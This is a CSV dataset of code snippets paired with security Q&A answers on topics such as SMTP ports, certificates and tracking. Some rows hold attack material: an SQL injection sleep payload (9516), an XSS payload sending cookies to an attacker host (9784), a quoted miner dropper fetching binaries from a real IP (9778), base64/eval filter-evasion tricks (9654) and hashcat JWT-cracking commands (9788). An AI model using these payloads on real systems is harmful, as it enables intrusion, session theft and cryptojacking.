,CODE,TEXT,code_token_length,text_token_length,security_terms_count,has_code_construct
9516,"GET / HTTP/1.x
X-Forwarded-For: hacker' OR sleep(5) AND '1'='1 --+
Connection: close
","The Payload worked in HTTP/1.0 and not in HTTP/1.1 . TL;DR: it worked in HTTP/1.0, it failed with an invalid HTTP/1.1 request but succeeded with a valid HTTP/1.1 request. Have a look at the request which was sent: {code-blk}. While this header was possible and widely used with HTTP/1.0 too it was not mandatory in HTTP/1.0 but is mandatory in HTTP/1.1. This means that the request you send is actually invalid with HTTP/1.1 which explains the response you get back from the server: For HTTP/1.1 : I Immediately get 400 Bad Request This immediate response from the server means that the request was rejected and not forwarded to the vulnerable web application. The well-formed HTTP/1.0 request instead was not rejected and resulted in the successful exploit: For HTTP/1.0 : I get 200 OK after 5 seconds After the HTTP/1.1 request was fixed the exploit worked there too: Once I added Host Header. SQLi worked with 1.1 as well.",35,224,3,True
9536,"       If the password field contains some string that is not a valid
       result of crypt(3), for instance ! or *, the user will not be
       able to use a unix password to log in (but the user may log in
       the system by other means).

   -l, --lock
       Lock the password of the named account. This option disables a
       password by changing it to a value which matches no possible
       encrypted value (it adds a ´!´ at the beginning of the password).

       Note that this does not disable the account. The user may still
       be able to login using another authentication token (e.g. an SSH
       key). To disable the account, administrators should use usermod
       --expiredate 1 (this set the account's expire date to Jan 2,
       1970).

       Users with a locked password are not allowed to change their
       password.
","Yes, that is the standard way in Unix, and has been for ages. The  manual page answers your question explicitly: {code-blk}",185,34,1,True
9537,"EHLO hostname
250-submission.server Hello hostname [192.168.3.4], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-8BITMIME
250-SIZE 16777216
250-DSN
250-STARTTLS
250-DELIVERBY
250 HELP
","TL;DR: If your users are using 587 to submit email for relay, you need to secure it (by requiring STARTTLS before AUTH) or disable it in favor of an alternative like 465 (SMTPS).  If none of your users is using 587, of course, you can disable it without concern, as all normal mail flows through port 25. There are three commonly used ports for SMTP email - 25, 465, and 587. 25 is the standard SMTP port which is used by mail transfer agents everywhere.  If that goes away, you will stop getting email from the rest of the world. 465 (""SMTPS"" or ""SSMTP"", where the extra ""S"" stands for ""Security"") and 587 (""submission"") are alternate ports which speak SMTP, designed for use by a more limited pool of your own trusted users.  To quote : {code-blk} If it does offer AUTH while unencrypted, you will need to either require STARTTLS before AUTH or disable 587 and use something like 465 over SSL/TLS instead. If you don't have Mail User Agents which belong to your domain submitting mail over the network for relay, you don't need 587 or 465 in any case.",74,289,1,True
9543,"#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    char *path = getenv(""_"");
    printf(""%s\n"", argv[0]);
    printf(""%s\n"", path);
    return 0;
}

$ gcc -o main main.c
$ ./main
./main
./main
$ gdb main
...
(gdb) r
Starting program: /home/user/tmp/main
/home/user/tmp/main
/usr/bin/gdb
[Inferior 1 (process 21694) exited normally]
(gdb)
","In this context, the {code-blk} NOTE: This is not unique to Linux, you can do it on macOS and probably other POSIX systems too. ALSO NOTE: The is a really cheap trick that is really easy to bypass and has a high chance of not working as intended (both false positives and false negatives).",185,77,1,True
9544,"                ---------- VPN2
Laptop --- Phone
                ---------- VPN1
","To be very clear, let's forget about mobile phones for a second. Let's assume your router is a VPN client of VPN2 and your laptop is a VPN client of VPN1. {code-blk} So there is never a VPN within a VPN in this scenario . Just to be sure, I tested this, and you can test it too. With an Android phone connected to a VPN, a hotspot client's traffic did not go through the VPN and went directly from the phone to the destination. This can be verified by going to any website that displays your IP address. You will find (with WHOIS) that it belongs to your wireless carrier and not the VPN provider.",18,153,1,True
9565,"y = document.getElementsByClassName('gravatar-wrapper-32');
for (idx = 0, len = y.length; idx < len; ++idx) {
  y[idx].firstChild.src = ""https://www.gravatar.com/avatar/370bb2bee74fc88763dc0fe35477e24c?s=32&d=identicon&r=PG""
}
",I am going to ignore everything cept: and is there any risk associated with the fact that they don't filter braces at all In a word No. What you are looking at is all {code-blk} params ... if you wanted to you could just change the entire string on client side and ... no one would really care.  when you submit the JSON is the real test. If the developer of the Server Side code does not properly validate the JSON to make sure extra things where not added or removed THEN there would be risks associated (but that is a topic for another question).,129,132,1,True
9579,"$ openssl ciphers -V 'SHA+RC4'
  0xC0,0x11 - ECDHE-RSA-RC4-SHA       SSLv3 Kx=ECDH     Au=RSA  Enc=RC4(128)  Mac=SHA1
  0xC0,0x07 - ECDHE-ECDSA-RC4-SHA     SSLv3 Kx=ECDH     Au=ECDSA Enc=RC4(128)  Mac=SHA1
  0xC0,0x16 - AECDH-RC4-SHA           SSLv3 Kx=ECDH     Au=None Enc=RC4(128)  Mac=SHA1
  0xC0,0x0C - ECDH-RSA-RC4-SHA        SSLv3 Kx=ECDH/RSA Au=ECDH Enc=RC4(128)  Mac=SHA1
  0xC0,0x02 - ECDH-ECDSA-RC4-SHA      SSLv3 Kx=ECDH/ECDSA Au=ECDH Enc=RC4(128)  Mac=SHA1
  0x00,0x05 - RC4-SHA                 SSLv3 Kx=RSA      Au=RSA  Enc=RC4(128)  Mac=SHA1
  0x00,0x8A - PSK-RC4-SHA             SSLv3 Kx=PSK      Au=PSK  Enc=RC4(128)  Mac=SHA1
","From : CIPHER LIST FORMAT... It can consist of a single cipher suite such as RC4-SHA.... Lists of cipher suites can be combined in a single cipher string using the + character. This is used as a logical and operation. For example SHA1+DES represents all cipher suites containing the SHA1 and the DES algorithms. Thus, {code-blk}",331,101,1,True
9588," X509v3 Subject Key Identifier:
     6A:72:26:7A:D0:1E:EF:7D:E7:3B:69:51:D4:6C:8D:9F:90:12:66:AB
 X509v3 Authority Key Identifier:
     keyid:68:90:E4:67:A4:A6:53:80:C7:86:66:A4:F1:F7:4B:43:FB:84:BD:6
","I3 is ""link cert"", meant to bridge across a Root CA rollover. Evidence: {code-blk}. Though I suspect they have done that because some other client only has Rold in their trust store and needs the link cert to be there.",125,57,1,True
9590,"The keyIdentifier field of the authorityKeyIdentifier extension MUST
be included in all certificates generated by conforming CAs to
facilitate certification path construction.  There is one exception;
where a CA distributes its public key in the form of a ""self-signed""
certificate, the authority key identifier MAY be omitted. 
","Trust for intermediates? You wrote: as I have trusted all the certificates including root That sounds wrong. You don't usually explicitly trust intermediates. (You might however explicitly DISTRUST them if they get compromised.) Why do any chain building/verification at all then if you can just finish at the first intermediate up the chain? Mixup with intermediate? Just wrong chain sent? I've added some links to crt.sh to your question. And it seems that what you call ""i2"" is not an intermediate cert at all, but a root cert. Is this a mistake? => See You wrote that it's not ""treated as a root certificate"". How can you tell? -- I think the chain that is being sent is just wrong/not up to spec. => Try checking with  -- This will alert on chain irregularities. Also: I looked this up:  not having an {code-blk}",69,204,1,True
9607,"- Standard HTTP Cookies
- HTTP Strict Transport Security (HSTS) Pinning
- Local Shared Objects (Flash Cookies)
- Silverlight Isolated Storage 
- Storing cookies in RGB values of auto-generated, force-cached 
   PNGs using HTML5 Canvas tag to read pixels (cookies) back out
- Storing cookies in Web History 
- Storing cookies in HTTP ETags 
- Storing cookies in Web cache 
- window.name caching
- Internet Explorer userData storage
- HTML5 Session Storage 
- HTML5 Local Storage 
- HTML5 Global Storage 
- HTML5 Database Storage via SQLite
- HTML5 IndexedDB
- Java JNLP PersistenceService
- Java CVE-2013-0422 exploit (applet sandbox escaping)
","Definitely yes. There are much more mechanisms to track you through the web. First of all, there are ""normal"" cookies which are stored like a file. But it´s easy to delete them from your PC. After that there is a technique called ""Evercookie"". It works like a normal Cookie but it's very hard to delete. It stores its information in any of these locations: {code-blk} That's quite a lot of places for them. Another evercookie can be stored as DNS entry from a server which does not exist. If it's recorded on your PC the webpage knows that you have visited it before. After the evercookie, there are different methods to track your phone or tablet through your battery load with the ""Battery Status API"" in HTML5. You can read more Information about it . A very new thing is to track the user through . This is a very unconventional method and I'm quite sure no one uses it right now but as you can see it's possible! There are more methods but I think these are the interesting ones. Especially the Evercookie and normal Cookie is currently used to track us all. Now the interesting part. How can you prevent being traced? Generally, it's very hard. If you want to be hidden you should consider moving over to tails and Tor in combination with a VPN. It's definitely better than Windows. If you still want to use Windows you can use some extensions like NoScript or Privacy Badger. They help you to reduce the amount of tracking but also can't prevent it 100%.",182,347,1,True
9621,"safesploit$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=122 time=10.788 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=122 time=9.498 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=122 time=9.502 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=122 time=9.685 ms
","Pages seem to start loading a little later than they used to. Treat this as latency, so review your ping. You can check your ping time against a server from the command line: Command Prompt (Windows), Terminal (OS X) and Linux, well too many for me to list off. Ping Google's public DNS server 8.8.8.8, as it is well documented, and has known response times. Via the Internet connection, I am currently connected to, a VDSL line my Speed Test result is: Note the ping of 7ms via fdcservers.net. Below you will see ping results from Google's public DNS server 8.8.8.8. {code-blk} Do give margin, but this is a good response time (6-12ms) for VDSL and hybrid fibre-coaxial. Is there any way to check whether there is some kind of MITM attack happening? You can check if a MITM attack is being performed on your LAN by checking your ARP table. See  as this is quite an involved topic, and it has already been answered. Outside your network, a Trace Route might be advisable, although it becomes particularly more difficult. As suggested port 8080 might be blocked. You can either use NMap to port scan, connect using the Tor Browser bundle and specific for Tor to use port 8080 and see, or use  by Tor.",168,313,2,True
9623,"safesploit$ curl bit.ly -v
* Rebuilt URL to: bit.ly/
*   Trying 67.199.248.10...
* TCP_NODELAY set
* Connected to bit.ly (67.199.248.10) port 80 (#0)
> GET / HTTP/1.1
> Host: bit.ly
> User-Agent: curl/7.54.0
> Accept: */*
> 
< HTTP/1.1 302 Moved Temporarily
< Server: nginx
< Date: Sat, 18 Aug 2018 16:51:43 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: https://bitly.com/
< 
<html>
<head><title>302 Found</title></head>
<body bgcolor=""white"">
<center><h1>302 Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
* Connection #0 to host bit.ly left intact
","{code-blk} over the Tor network and produce the same result. So, it seems more likely the university is performing a MITM. I should be careful with that wording though, as it is their network and leaves onto the Internet via their routers, but it is possible for traffic to be redirected, either on ingress (inbound) or egress (outbound). E.g. like how web servers redirect you to Error 404, the university can do the same, if domain youtube.com:443 then redirect to 192.168.1.100/websiteNotAllow.html. Here are some ideas how you could ""block"" access to a website yourself on your local machine. . As for circumventing this censorship look at  which I outline points regarding circumventing censorship using Tor and  where I mention about different types of SOCKS proxies.",263,201,2,True
9654,"cd $(printf '\x2fetc')
cd $(base64 -d <<< 'L2V0Ywo=')
cd $(awk 'BEGIN{printf(""%cetc"",47);}')
cd $(cut -b1 <<< $HOME)etc
eval $(base64 -d <<< 'Y2QgL2V0Ywo=')
","Yes, this is possible. In most shells, there are plenty of ways to do this. Any way you can encode and decode something in a subshell into ASCII will work. A few examples for bash: {code-blk}, any of these should suffice perfectly. Note that some of these use bash-isms and are not perfectly POSIX-compliant.",111,89,1,True
9667,"http_proxy=88.211.x.x:8080 curl -A 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko' -v 'http://103.208.86.131/'
*   Trying 88.211.x.x...
* Connected to 88.211.x.x (88.211.x.x) port 8080 (#0)
> GET http://103.208.86.131/ HTTP/1.1
> Host: 103.208.86.131
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
< HTTP/1.1 302 Found
< Date: Thu, 13 Sep 2018 18:48:47 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.25
< Location: index2.php?&sessionid=08bcaee2029a8a766175c5c8cebc8bff&securessl=true
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host 88.211.x.x left intact
","My first guess was the site was probably using your User Agent string to identify if you are vulnerable or not. As you are using {code-blk} And it connected, redirected me to another page.",332,47,1,True
9671,":~> whois au
% IANA WHOIS server
% for more information on IANA, visit http://www.iana.org
% This query returned 1 object

domain:       AU

organisation: .au Domain Administration (auDA)
address:      Lv 17
address:      1 Collins St
address:      Melbourne VIC 3000
address:      Australia


:~> whois edu.au
Domain Name: EDU.AU
Registry Domain ID: D407400000002449554-AU
Registrar WHOIS Server: whois.auda.ltd
Registrar URL: http://www.afilias.com.au
Last Modified:
Registrar Name: Afilias Australia Pty Ltd

:~> whois sydney.edu.au
Domain Name: SYDNEY.EDU.AU
Registry Domain ID: D407400000000057080-AU
Registrar WHOIS Server: whois.auda.org.au
Registrar URL: https://www.domainname.edu.au
Last Modified: 2018-07-17T00:59:06Z
Registrar Name: EDUCATION SERVICES AUSTRALIA LIMITED
","Welcome to Security! The case of educational/government intitutions is a particular case of subdomaining. Basically ICANN, who rules the Internet top names, delegated maangement of the {code-blk} because Requires applicant to have national interests and resposibilities or be recognized and delivering services in more than one state or territory Summarizing You can never apply for your favourite sub-sub domain at a public registrar, because technical reasons require you to pass through the owner of the level-minus-one domain. DNS is hierarchical. But if the organization owning your third or fourth level domain (like sydney.edu.au in the example) flaws in filtering domain applications, that is their own organizational problem and is not a flaw in the DNS system.",265,187,1,True
9673,"Probability(event type 1) * Cost(event type 1) + 
Probability(event type 2) * Cost(event type 2) + 
... +
Probability(event type N) * Cost(event type N)
","The best advice I have heard is to figure out a list of all of the different types of events that could occur as a result of your security debt.  Next, try to estimate the cost of each of those events.  Next, figure out the likelihood of those events occurring per year.  Your final formula should look something like {code-blk} For example, let's say you determine that there are two issues which could be exploited by your security debit: SQL Injection + CSRF.  (I've made up numbers to make the math easier): We expect 5 successful SQL injection attacks per year, each of which would have a recovery cost of $100,000 We expect 10 successful CSRF attacks with a recovery cost of $25,000 apiece Your estimated cost of security debt for the year in question would be: (5 * $100,000) + (10 * $25,000) = $750,000",49,188,1,True
9702,"{
  ""_id"": ""admin.123"",
  ""user"": ""123"",
  ""db"": ""admin"",
  ""credentials"": {
    ""SCRAM-SHA-1"": {
      ""iterationCount"": 10000,
      ""salt"": ""f9SdPCCcBOwk71/xDkj6Sw=="",
      ""storedKey"": ""83mNhTYctOdlYsL1sbnfpiA0uxw="",
      ""serverKey"": ""09H9aEKKufaoCDxqUkHntx6EqrE=""
    }
  },
  ""roles"": []
}
","MongoDB does not store passwords in plaintext.  As of MongoDB 3.0, Salted Challenge Response Authentication Mechanism (SCRAM) is the default authentication mechanism for MongoDB.  Scram supports both SCRAM-SHA-1 and SCRAM-SHA-256 hashing mechanisms. Having said that, when interfacing with a database via driver, these often accept a hashed password so that it is not transmitted to and from the database in plaintext form.  This imposes additional responsibility on the developer because he/she has to perform the hashing at their end using the same algorithm as is employed within the DB server.  Luckily, these are readily available for just about any programming language. Querying the system.users collection will return a document similar to this: {code-blk} You can delve into the users and other collections with a good DB admin tool such as .  It lets you view documents in three formats: Tree, JSON, and grid: Hope that answers your question. rob",165,228,2,True
9706,"byte[] publicKey = getLogicalKeyBytes(unsortedIdentityKeys);  
byte[] hash = ByteUtil.combine(ByteUtil.shortToByteArray(FINGERPRINT_VERSION), publicKey, stableIdentifier.getBytes());  

for (int i=0;i<iterations;i++) {
        digest.update(hash);
        hash = digest.digest(publicKey);
      }
","The safety number is a derivation of the stable identifier and the public key of a user. Safety numbers are computed for both people in a conversation. The real important code is this snipit {code-blk} What's happening in is we are taking the fingerprint version, public key, and stable identifier as starting inputs and hashing that once with SHA-512. The second iteration apends the public key to the hash we just produced, then hashes it a second time. This process of adding the public key and repeating the hash continues for the number of indicated iterations. Why do we need to do more iterations than the past? This is due to a fundamental issue if hashing. Which is the possibility of hash collisions. Let's say I'm an attacker (Eve). Alice wants to talk to Bob, so Signal sends her public key to Bob, but Eve intercepts the public key and substitutes her own. Normally there is an indication the key changed, and the Safety Number changes. IF Eve had enough resources she could construct a public key which matched the safety number. To combat this threat we make it so that Eve would need to find a collision which occurs after 5200 rounds of hashing, with adding that same key every round. This becomes computationally infeasible since each round of hashing makes finding a collision linearly more computationally expensive. The number of iterations currently picked usually is calculated on how long an attack of this style would take based in resources of the percieved threat. I can't find any calculations from Signal as to specifically why they picked 5200.",118,378,1,True
9730,"NAME
       gpg - OpenPGP encryption and signing tool
...
COMMANDS
       -e     Encrypt data...
OPTIONS
       -a     Create  ASCII  armored  output...
       -r     Encrypt for user id name...

$ gpg -aer $USER  <<<""Hello world."" >/tmp/file1.pgp
$ ls -l /tmp/file1.pgp
-rw-r--r-- 1 user user 533 nov  9 15:39 /tmp/file1.pgp

$ gpg -qd /tmp/file1.pgp
Hello world.

$ gpg -aer aFriendOfMine <<<""Hello world."" >/tmp/file1.pgp
$ ls -l /tmp/file1.pgp
-rw-r--r-- 1 user user 533 nov  9 15:42 /tmp/file1.pgp

$ gpg -qd /tmp/file1.pgp
gpg: decryption failed: No secret key

$ gpg -aer $USER -r aFriendOfMine <<<""Hello world."" >/tmp/file1.pgp
$ ls -l /tmp/file1.pgp
-rw-r--r-- 1 user user 902 nov  9 15:43 /tmp/file1.pgp

$ gpg -aer $USER -r aFriendOfMine -r alice -r bruno -r charlie -r theDude \
      <<<""Hello world."" >/tmp/file1.pgp
$ ls -l /tmp/file1.pgp
-rw-r--r-- 1 user user 3027 nov  9 16:26 /tmp/file1.pgp
","Simply try: Preamble: From {code-blk} The file is something bigger, but each recipient will be able to read them.",471,33,1,True
9747,"    SSLCertificateFile /etc/apache2/ssl/safesploit.com.cert.pem
    SSLCertificateKeyFile /etc/apache2/ssl/safesploit.com.key.pem
    SSLCertificateChainFile /etc/apache2/ssl/fullchain.pem
","Are there any known cases of HTTPS websites leaking the private key of their SSL certificate? Strictly speaking, a private key should have permissions {code-blk} So, while I understand your concern regarding a 'bad admin' placing the private key within the fullchain, it simply is not possible within Apache 2 vanilla, unless Apache was modified to accept this type of configuration. For context: Public keys  -r--r--r--   root root Private keys -r--------   root root",90,116,1,True
9749,"; cgi.fix_pathinfo provides *real* PATH_INFO/PATH_TRANSLATED support for CGI.  PHP's
; previous behaviour was to set PATH_TRANSLATED to SCRIPT_FILENAME, and to not grok
; what PATH_INFO is.  For more information on PATH_INFO, see the cgi specs.  Setting
; this to 1 will cause PHP CGI to fix its paths to conform to the spec.  A setting
; of zero causes PHP to behave as before.  Default is 1.  You should fix your scripts
; to use SCRIPT_FILENAME rather than PATH_TRANSLATED.
; http://php.net/cgi.fix-pathinfo
;cgi.fix_pathinfo=1
",Even now it seems to carry danger because of how PHP is still processing script from the 1st occurence of found file. So why did they keep the default as {code-blk} CGI Spec.,186,47,1,True
9750,"$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = ""visitors.html"";
$file = fopen($file, ""a"");
$data = ""<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time :    $dateTime <br></pre>"";
fwrite($file, $data);
fclose($file);
","There are numerous ways to track you on the internet by web services such as Google, etc. Assume that you are visiting some website addressed: WWW.example.com, this website has been written in PHP and includes a script that reaches your ID by your IP Address. This script finds your IP Address by some piece of code such as the following: {code-blk} Another way to do this, is cookies. Some websites are always gathering your cookies with or without your permission, these include your IP Address, operating system and browser type. You can always bypass all of these mechanisms by searching Google, there are a lot of videos out there for you to watch and learn.",161,147,1,True
9759,"   127.0.0.0/8 - This block is assigned for use as the Internet host
   loopback address.  A datagram sent by a higher-level protocol to an
   address anywhere within this block loops back inside the host.  This
   is ordinarily implemented using only 127.0.0.1/32 for loopback.  As
   described in [RFC1122], Section 3.2.1.3, addresses within the entire
   127.0.0.0/8 block do not legitimately appear on any network anywhere.

        (g)  { 127, <any> }

             Internal host loopback address.  Addresses of this form
             MUST NOT appear outside a host.
","What are the security implications of allowing 127.0.0.1 access to the internet? None. For decades 127.0.0.0/8 has been defined as only usable within the host. It is not a valid IP address for any use in any place on any network. says this about the range: {code-blk} is now over 29 years old. Every correct implementation of IP in any router or Internet facing appliance is going to follow this behavior. The only way packets addressed to this IP could move around in a network is if the implementation of the IP protocol was severely broken in the first place. Any idea why an app would be dependent on this type of configuration (I am not a developer)? There is no valid consideration for this configuration. None. Zero. Zilch. Nor should you consider making configuration changes to allow such traffic. If the application developer is telling you to do this, then either (a) they don't know what they are talking about or (b) they are trying to do something so severely broken that they have proven (a). The only use for sending traffic to 127.0.0.1 is if the traffic is being sent to an application or service running on the host itself (i.e. like a locally hosted proxy server, tunnels of any variety, etc ). That application or service may process the traffic and try to send it to some other destination, but if it is trying to send traffic for another host to 127.0.0.1 then it is broken. Period.",133,318,1,True
9778,"cd /tmp; wget http://205.185.113.123/mcoin; chmod 777 mcoin; ./mcoin -o 205.185.113.123:3333 -p x -k -a cryptonight -B --max-cpu-usage=90; rm -rf RjsWs
cd /tmp; wget http://205.185.113.123/sefa.x86; chmod 777 sefa.x86; ./sefa.x86 xd
rm -rf ex.sh
","Yes,This exploit is basically shell upload .In which attacker upload the file and that file directly interact with your server to perform the system commands remotely. I already download that file from your link that looks like this {code-blk} Basically that file download 2 more file that is mcoin and sefa.x86 you need to look for those 2 files as well.Those two files are pre-compiled file so its very hard tell what actually that does to your server. But according to my study those files are crypto-currency miners. Answers: 1) Is this an attack? If so, that is the name of this attack? Yes,Shell Upload 2) Can this attack be adapted for Django instead of PHP? If you really want know that attack is successfully executed than you need to search your web server directory and find those file name ex.sh mcoin sefa.x86 3) Is this normal for web apps? Do they always get that kind of requests? No, 4) Is this illegal? If so, can I start a legal action? yes this is illegal,Yeah you can take the legal action",158,253,1,True
9784,"<!-- note the .js instead of .html; 
     the JS file would then contain JS code (not HTML code) 
      and do something malicious
 -->
<script src=""https://My_ip/index.js""></script>

<!-- here, HTTP is OK because it's just a redirect, not loading scripts -->
<script>
document.location='http://my_ip/write.php?c='+document.cookie;
</script>
","As far as I can tell, there are two issues here: modern browsers will not fetch mixed active content (ie JavaScript served via HTTP when the site is HTTPS). you can't include a HTML file as a script (because it doesn't contain valid JavaScript code). So what you want to do is include a JavaScript - not an HTML - file in your XSS payload via HTTPS. Or you could just use the actual payload directly instead of fetching the script first. So your XSS payload should be either of these: Fetch script: {code-blk}",125,136,1,True
9787,"BasicOCSPResponse ::= SEQUENCE {
  tbsResponseData          ResponseData,
  signatureAlgorithm       AlgorithmIdentifier,
  signature                BIT STRING,
  certs                [0] EXPLICIT SEQUENCE OF Certificate OPTIONAL }
","Actually, the bullet list does not contain the certs. But directly underneath it is mentioned: The responder MAY include certificates in the certs field of BasicOCSPResponse that help the OCSP client verify the responder's signature. And in B.1.  OCSP in ASN.1 - 1998 Syntax {code-blk} Thus the answer to my question is: The client looks for a certificate in the certs list of the response that matches the ResponderID in either name or key hash: o  either the name of the responder or a hash of the responder's public key as the ResponderID; Then it validates the chain to verify that the response was signed by a trusted or authorized responder. I found it helpful to review the",69,175,1,True
9788,"Using a Wordlist:  
$ hashcat -a0 -m 16500 text.hash [dict]

Pure Brute force attack:  
$ hashcat -a3 -m 16500 text.hash
","JWT Token Structure As detailed on the JWT website (), JWT token consists of three parts separated by a dot (.), which are - Header, Payload and Signature. Both Header and Payload are Base64 encoded strings. Therefore a JWT token would typically look like this: Base64(Header).Base64(Payload).Signature The signature is created by taking both the header and the payload, use a secret key to create a signature by using the algorithm specified in the Header. Finding JWT Secret Key What you need to do to solve this challenge is to find the secret key that has been used to create the signature. This can be done by using a brute force attack to calculate the signature by using different secret keys either from a wordlist or through a pure brute force attack. The correct syntax to use to conduct brute force attack to find the secret key using Hashcat is: {code-blk} The option -m 16500 is the correct Hash Mode to brute force JWT tokens using Hashcat. The one that you have used (-m 1450) is for raw HMAC-SHA256 hash and is applied to the whole string, therefore resulting in an error. The above method works fine for me to find a secret key for a given JWT token, however, I am not able to solve the WebGoat challenge yet. I am trying to get in touch with the Webgoat team to understand the problem and to solve this challenge. I will provide an update when I hear back from them and can solve the challenge.",50,361,3,True
9797,"[] = the network connection between the clients and your Firewall,
() = the network connection between the print server and your Firewall,
{} = the (network?) connection between the Print Server and your Printer(s) 
","Ideally, printers are to be seperated from their clients (and the internet) as much as possible. There seems to be some kind of confusion on your side between categories of network devices. I'm assuming you're coming from a COTS standpoint which usually means that a device called ""Router"" does carry the jobs of ""Router"", ""Firewall"", ""Switch"", ""WiFi Access Point"", ""Gateway"" and ""NAT"", which might lead to the confusion. A network architecture that can provide this might in it's simplest possible layout (which can easily be more complicated when deploying microsegmentation between clients and/or printers for example) look like this: {code-blk} Now, the connection between the print server and the Printer(s) doesn't need to be networked. The printers could just be locally connected to the print server, for example by USB or LPT. Also worth noting is that this setup is minimal for this case; usually, there are different subnets of clients that need different printer access which leads to vastly more complicated setups that do seperate networks even further, using more Firewalls, Gateways and Print Servers. Please also note that none of this includes internet access thus far. In this setup, internet might be provided through the Firewall (over a seperate network connection) and access rules on the firewall would prohibit internet access for the print server. Additionally, COTS ""Router"" devices usually do not provide all features of actual Firewalls, making this setup hard to achieve with it - and you usually do not. One notable exception are COTS Routers that offer a USB Port to connect a printer to in which case the device itself functions as the print server. Lastly, please note that the threat model for private households and companies vastly differ and this setup might not be suitable for home deployment.",48,420,6,True
9829,"<VirtualHost *:443>
    ...
        SSLVerifyClient optional
        SSLVerifyDepth 1
        SSLCACertificateFile ""/etc/ssl/private/ca.crt""
        SSLOptions +StdEnvVars
    ...

</VirtualHost>

<?php
  echo $_SERVER['SSL_CLIENT_S_DN'];
  echo $_SERVER['SSL_CLIENT_S_DN_CN'];
?>
","You can surely do this with open source. So I think it is possible with IIS as well. Assuming you mean ** TLS Client Authentication** (2-way SSL). With Apache2 Client Authentication works by exposing the authenticated user's data to your web application. Here is a sample app I put together to . Here are the relevant pieces. Config to use TLS Client Auth (this works w/ a single root, but you can also use multiple CAs by specifying {code-blk} This way you can verify which client is authenticating in your web application. I am not familiar with how IIS handles these cases, but I think it is supported in some way. The key is to have it configured in a way to use multiple CAs when authenticating the clients.  post should help. Alternatively, you can check out  that provide a similar level of protection that TLS Client Certificates do.",126,205,2,True
9842,"#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifndef USER
#error please define USER in compile command
#endif

#define STRINGIFY(x) #x
#define TOSTRING(x) STRINGIFY(x)

const char * sourceFilename = __FILE__ ;
const char * compilingUser  = TOSTRING(USER) ;

int main(int argc, char **argv)
{
  if (fopen(sourceFilename, ""r"")) {
    printf(""%s\n"", ""You still have the source-code for this program."");
  }
  if (0 == strcmp(getenv(""USER""), compilingUser)) {
    printf(""%s\n"", ""You compiled this program."");
  }
  return 0;
}
","From an inspection of an executable compiled with Visual Studio 2010, it doesn't appear that the compiler, by default, includes any identifiable information about the user who ran the compilation or the host it was run on. It may be possible to determine exactly which version of the compiler was used by looking at the executable. The GNU compiler puts the compiler's exact version-string in its output. For ""managed"" executables, Visual Studio does allow various metadata like author and copyright to be specified; but it would require some sort of customization or build-script to put build-user or build-host information in the executable. It's certainly possible to use a build-script and the source-code itself to make sure that such identifying information is in the program.  For example, if you compile the following program with {code-blk}",234,184,1,True
